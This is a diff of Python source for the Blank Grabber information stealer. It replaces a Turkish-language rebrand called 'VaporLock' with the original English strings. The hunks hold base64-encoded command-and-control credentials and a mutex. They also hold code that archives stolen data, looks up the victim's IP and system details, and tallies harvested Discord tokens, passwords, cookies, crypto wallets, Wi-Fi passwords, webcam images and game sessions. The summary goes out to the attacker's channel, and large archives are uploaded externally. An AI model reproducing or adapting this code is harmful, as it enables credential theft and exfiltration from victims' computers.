@@ -21,8 +21,8 @@ from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warni
 disable_warnings_urllib3()
 
 class Settings:
-    C2 = (1, base64.b64decode('ODg3MTk2NjgwNTpBQUVTTElDTEJzbjMzNGpsU2lHTWwtRnRnbXZidTNyNkFQTSQtNTE5NDI3MTA2NQ==').decode())
-    Mutex = base64.b64decode('U3M4TmJCeW8wWEduRTRGMg==').decode()
+    C2 = (1, base64.b64decode('ODg3MTk2NjgwNTpBQUdtMVlsUHA1a3BrbmNKaHEzUHNXWU45YjJOVjVUUVhrNCQtMTAwMzY4NjcwNTU0NA==').decode())
+    Mutex = base64.b64decode('ZGJiUWc3N21uWHFKSFhPVw==').decode()
     PingMe = bool('')
     Vmprotect = bool('true')
     Startup = bool('')
@@ -781,7 +781,7 @@ class BlankGrabber:
     GrowtopiaStolen: bool = False
 
     def __init__(self) -> None:
-        self.Separator = '\n\n' + 'VaporLock'.center(50, '=') + '\n\n'
+        self.Separator = '\n\n' + 'Blank Grabber'.center(50, '=') + '\n\n'
         while True:
             self.ArchivePath = os.path.join(os.getenv('temp'), Utility.GetRandomString() + '.zip')
             if not os.path.isfile(self.ArchivePath):
@@ -1302,7 +1302,7 @@ class BlankGrabber:
         extention = self.CreateArchive()
         if not os.path.isfile(self.ArchivePath):
             raise FileNotFoundError('Failed to create archive')
-        filename = 'VaporLock-%s.%s' % (os.getlogin(), extention)
+        filename = 'Blank-%s.%s' % (os.getlogin(), extention)
         computerName = os.getenv('computername') or 'Unable to get computer name'
         computerOS = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()
         computerOS = computerOS[2].strip() if len(computerOS) >= 2 else 'Unable to detect OS'
@@ -1319,20 +1319,20 @@ class BlankGrabber:
             r: dict = json.loads(http.request('GET', 'http://ip-api.com/json/?fields=225545').data.decode(errors='ignore'))
             if r.get('status') != 'success':
                 raise Exception('Failed')
-            data = f"\nIP: {r['query']}\nBölge: {r['regionName']}\nÜlke: {r['country']}\nZaman Dilimi: {r['timezone']}\n\n{'Hücresel Veri:'.ljust(20)} {(chr(9989) if r['mobile'] else chr(10062))}\n{'Proxy/VPN:'.ljust(20)} {(chr(9989) if r['proxy'] else chr(10062))}"
+            data = f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {(chr(9989) if r['mobile'] else chr(10062))}\n{'Proxy/VPN:'.ljust(20)} {(chr(9989) if r['proxy'] else chr(10062))}"
             if len(r['reverse']) != 0:
                 data += f"\nReverse DNS: {r['reverse']}"
         except Exception:
             ipinfo = '(Unable to get IP info)'
         else:
             ipinfo = data
-        system_info = f'Bilgisayar Adı: {computerName}\nİşetim Sistemi: {computerOS}\nToplam Ram: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nÜrün Anahtarı: {productKey}'
-        collection = {'Discord Accounts': self.DiscordTokensCount, 'Şifreler': self.PasswordsCount, 'Kurabiyeler': len(self.Cookies), 'Geçmiş': self.HistoryCount, 'Otomatik Doldurmalar': self.AutofillCount, 'Roblox Kurabiyeleri': self.RobloxCookiesCount, 'Telegram Oturumları': self.TelegramSessionsCount, 'Sıradan Klasörler': self.CommonFilesCount, 'Cüzdanlar': self.WalletsCount, 'Wifi Şifreleri': self.WifiPasswordsCount, 'Kamera': self.WebcamPicturesCount, 'Minecraft Oturumları': self.MinecraftSessions, 'Epic Oturumları': 'Yes' if self.EpicStolen else 'No', 'Steam Oturumları': 'Yes' if self.SteamStolen else 'No', 'Uplay Oturumları': 'Yes' if self.UplayStolen else 'No', 'Growtopia Oturumları': 'Yes' if self.GrowtopiaStolen else 'No', 'Ekran Görüntüsü': 'Yes' if self.ScreenshotTaken else 'No', 'Sistem Bilgisi': 'Yes' if self.SystemInfoStolen else 'No'}
+        system_info = f'Computer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}'
+        collection = {'Discord Accounts': self.DiscordTokensCount, 'Passwords': self.PasswordsCount, 'Cookies': len(self.Cookies), 'History': self.HistoryCount, 'Autofills': self.AutofillCount, 'Roblox Cookies': self.RobloxCookiesCount, 'Telegram Sessions': self.TelegramSessionsCount, 'Common Files': self.CommonFilesCount, 'Wallets': self.WalletsCount, 'Wifi Passwords': self.WifiPasswordsCount, 'Webcam': self.WebcamPicturesCount, 'Minecraft Sessions': self.MinecraftSessions, 'Epic Session': 'Yes' if self.EpicStolen else 'No', 'Steam Session': 'Yes' if self.SteamStolen else 'No', 'Uplay Session': 'Yes' if self.UplayStolen else 'No', 'Growtopia Session': 'Yes' if self.GrowtopiaStolen else 'No', 'Screenshot': 'Yes' if self.ScreenshotTaken else 'No', 'System Info': 'Yes' if self.SystemInfoStolen else 'No'}
         grabbedInfo = '\n'.join([key + ' : ' + str(value) for key, value in collection.items()])
         match Settings.C2[0]:
             case 0:
-                image_url = 'https://raw.githubusercontent.com/WEJUEKNII/parrse/refs/heads/main/vaporlock.png'
-                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'VaporLock', 'description': f'**__Sistem Bilgisi__\n```autohotkey\n{system_info}```\n__IP Bilgisi__```prolog\n{ipinfo}```\n__Alınan Bilgiler__```js\n{grabbedInfo}```**', 'url': 'https://github.com/Blank-c/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Yapımcı: Croxlv | Tüm bilgiler VaporLock tarafından toplanmıştır'}, 'thumbnail': {'url': image_url}}], 'username': 'Blank Grabber', 'avatar_url': image_url}
+                image_url = 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png'
+                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'Blank Grabber', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/Blank-c/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber'}, 'thumbnail': {'url': image_url}}], 'username': 'Blank Grabber', 'avatar_url': image_url}
                 if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20:
                     url = self.UploadToExternalService(self.ArchivePath, filename)
                     if url is None:
